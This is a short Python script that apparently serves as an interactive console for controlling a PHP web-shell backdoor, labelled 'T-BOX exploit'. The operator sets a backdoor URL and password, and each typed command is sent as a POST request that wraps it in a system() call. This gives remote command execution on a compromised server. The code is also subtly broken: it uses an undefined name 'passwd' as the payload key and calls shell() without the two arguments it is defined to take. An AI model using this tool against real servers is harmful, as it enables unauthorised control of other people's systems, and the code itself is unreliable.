import requests


url = 'None'
password = 'None'


def shell(password,url):
    while True:
        cmd = input('shell >')
        if cmd == 'back' or cmd == 'exit':
            print('[*]goodbye')
            break

        else:
            POST = "system(\'"+ cmd +" \');"
            payload={
                    passwd:POST
                }
            print('[+]'+url)
            response=requests.post(url,payload,timeout=10)
            print(response.text)

while True:
    cmd = input('T-BOX exploit(listen/python) >')
    if cmd == 'show options':
        print('                                                          ')
        print('----------name---------content------------present---------')
        print('          URL           ' + url + '              后门网址    ')
        print('        password        ' + password + '           后门密码    ')
        print('                                                          ')

    elif cmd[:13] == 'set password ':
        password = cmd[13:]
        print('[*]password ==> '+password)

    elif cmd[:8] == 'set url ' or cmd[:8] == 'set URL ':
        url = cmd[8:]
        print('[*]url ==> ' + url)

    elif cmd == '':    
        pass

    elif cmd == 'run':
        if password == 'None' or url == 'None':
            print('[-]请设置url或者后门密码')
        else:
            shell()

    elif cmd == 'back':
                break
            
    else:
        print("[-]can't find command: " + cmd)


